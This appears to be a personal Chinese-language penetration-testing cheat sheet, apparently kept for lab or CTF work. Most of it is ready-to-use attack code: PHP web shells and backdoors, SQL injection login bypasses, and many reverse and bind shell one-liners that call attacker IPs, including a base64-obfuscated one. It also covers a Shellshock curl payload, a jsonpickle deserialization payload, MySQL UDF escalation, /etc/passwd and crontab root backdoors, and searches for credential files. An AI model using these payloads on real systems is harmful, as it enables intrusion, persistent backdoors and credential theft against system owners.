# linux提权

# 用过的交互式

交互式shell 
python3 -c 'import pty; pty.spawn("/bin/bash")' 

python -c 'import pty; pty.spawn("/bin/bash")'

os.execute("/bin/sh") ^abc63a

# 一些枚举
hostname  
主机名

uname -a
印系统信息，提供有关系统使用的内核的更多详细信息

/pro/version
查看 /proc/version 提供有关内核版本和其他数据的信

/etc/issud
/etc/issue 文件来识别系统 

ps -aux
选项将显示所有用户的进程 （a），显示启动进程的用户 （u），并显示未连接到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。

ps -axjf
查看进程树

env
环境变量

sudo -l
可用于列出可以使用 sudo 运行的所有命令

crontab -l
检查定时计划

# smtp 邮件木马
登录 smtp 服务发送邮件

```
MAIL FROM: test
RCPT TO: 用户
data
<?php system($_GET['shell']); ?>
.
QUIT
```
# sql万能密码
```
 1=1 -- - 

' or '' = '  

' or 1=1;--  

1 or 1=1  

" or ""="

'or 1='1
```
## 一句话木马
<?php @eval($_POST['attack']);?>

php ^657503
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 61.139.2.129 4444 >/tmp/f');?>

### 执行命令的

^8307dd

```
<?php system($_GET["cmd"]);?>
```

^3a4f50
easy-simple-php-webshell. php
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

### 图片马
```
copy /b 1.jpg + 1.php muma.png
```
# wp主题路径
```
/wordpress/wp-content/themes/twentynineteen/文件名
```

# 提权
```
find / -perm -u=s -type f 2>/dev/null
查找sudo权限的命令

find / -user root -perm /4000

cat /var/log/auth* | grep -i pass
寻找登录的密码

find / -type f -name 文件名
找指定文件名
```

## exim4
exim4提权


## rbash逃逸
这里得用rbash绕过的其中一中 用vi命令

我们进文件之后 随便vi一个文件 在里面输入

```
BASH——CMDS[A]=/bin/sh;a

set shell=/bin/bash
:shell

export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin/
```

### 环境变量逃逸
```
export -p        //查看环境变量
BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a
/bin/bash
export PATH=$PATH:/bin/         //添加环境变量
export PATH=$PATH:/usr/bin      //添加环境变量
```
#### linux 环境变量劫持
```
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
echo $PATH
/opt/statuscheck
```

^2b355a

### ssh逃逸
```
ssh mindy@61.139.2.158  "export TERM=xterm;python -c  'import pty;pty.spawn(\"/bin/bash\")'"
```

## echo
```
echo os.system("/bin/bash")
```
## teehee提权
可以看到使用teehee提权,teehee就是tee的变体从标准输入读取并写入标准输出和文件

我们可以借助teehee往passwd写入一个root账号即可得到root权限

/etc/passwd格式
username:password:User ID:Group ID:comment:home directory:shell

echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd

### teehee定时提权
```
sudo teehee /etc/crontab
* * * * * root chmod 4777 /bin/sh
```
## echo逃逸
echo os.system("/bin/bash")



# mysql的udf逃逸

^c66e64

## 1. 查看能否允许导入导出文件
```
 show variables like "%secure_file_priv%"
```

secure_file_priv是用来限制load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。

当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权
当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，
此时也无法提权 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权

## 2. 看是否是最高权限
```
 select * from mysql.user where user = substring_index(user(), '@', 1) ;
```
## 3. 查看plugin的值
```
select host,user,plugin from mysql.user where user = substring_index(user(),'@',1);
```


plugin值表示mysql用户的认证方式。当 plugin 的值为空时不可提权，为 `mysql_native_password` 时可通过账户连接提权。默认为`mysql_native_password`。另外，mysql用户还需对此plugin目录具有写权限。

## 4.  上传udf库文件

1. 获取plugin路径

```text
mysql> show variables like "%plugin%";
```

## 5.  获取服务器版本信息

```text
mysql> show variables like 'version_compile_%';
```

## 6. metasploit 文件

/usr/share/metasploit-framework/data/exploits/mysql

## 7. 找到匹配文件
然后在数据库中转成16进制
```
select hex(load_file('lib_mysqludf_sys.so文件存在的位置')) into outfile '需要保存到的位置/udf.txt';
```


## 8. 上传16进制的文件到数据库
```
select unhex('你的十六进制文本') into dumpfile '/usr/lib/mysqludf.so';
```

## 9.选择数据库添加函数

```
create function sys_eval returns string soname "mysqludf.so";
```

## 10. 调用函数 实验是否成功

```
select sys_eval('whoami');
```

# 绑定shell

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

nc -nv TARGET_IP 8080
```

# 反弹shell

^5af79a

```
nc -e 攻击者ip 端口 /bin/bash

bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 

bash -c ‘exec bash -i &>/dev/tcp/61.139.2.153/8888 <&1’

bash -c 'bash -i >& /dev/tcp/61.139.2.153/8888 0>&1'

mkfifo+/tmp/test;telnet+61.139.2.128+2334+0</tmp/test|/bin/sh+>+/tmp/test
```

^0be5ac

## php版本
```php
<?php  
$ip = '攻击者IP'; // 替换为攻击者监听IP  
$port = 监听端口; // 替换为攻击者监听端口  
$sock = fsockopen($ip, $port);  
$descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);  
$process = proc_open('/bin/sh', $descriptorspec, $pipes);  
proc_close($process);  
?>
```

## 脚本
```
echo 'mknod backpipe p && nc 61.139.2.153 4444 0<backpipe | /bin/bash 1>backpipe' > priv.sh

mknod backpipe p
作用​​：创建一个名为 backpipe`的​​命名管道（FIFO）​



0<backpipe | /bin/bash 1>backpipe
-将 `backpipe` 管道的内容作为 `nc` 命令的​**​标准输入（stdin）​**​

/bin/bash`​
    启动一个 Bash Shell 进程。
    
1>backpipe：  
    将 Bash 的​标准输出（stdout）​​重定向到 `backpipe` 管道

```

## 绕过版
```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMC4xMjgvODg4OCAwPiYx" | base64 -d | bash

bash -i >& /dev/tcp/192.168.110.128/8888 0>&1
```

## python
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.128",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
### 第二版
```
import sys import os os.system("nc -e /bin/bash 192.168.0.108 1234")
```

### 第三版
写入 python 脚本
```
echo 'import os; os.system("/bin/nc 10.10.16.2 8889 -e /bin/bash")' > /opt/tmp.py
```
## 写入 shell
```
echo 'bash -i >& /dev/tcp/192.168.61.135/4444 0>&1' > 脚本名
```

### shellshock 破壳漏洞

```
curl -A "() { :; }; /bin/bash -c 'nc 192.168.20.128 8888 -e /bin/sh'" http://192.168.20.133/cgi-bin/underworld
curl将bash命令作为特殊请求的User-Agent进行传递，实际上nc反弹shell的命令是由Bash执行的
```


## json 反弹 shell
```
{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["nc -nv 169.254.5.136 8888 -e /bin/bash"]}, null, null, null]}
```
# Windows

## 一些弱点：

Windows 服务或计划任务上的错误配置
    
分配给我们帐户的过多权限
    
Vulnerable software  易受攻击的软件

缺少 Windows 安全补丁

## 遇到无人值守

此类安装需要使用管理员帐户来执行初始设置

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

## powershell历史记录
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

## 保存的Windows凭证
cmdkey /list

## iis配置


- C:\inetpub\wwwroot\web.config
- C：\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
- C：\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

## python提权
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```


# XSS
## 存储型xss
<script>alert('xss')</script>
<SCRIPT>alert('xss')</SCRIPT>
<sc<script>ript>alert('xss')</script>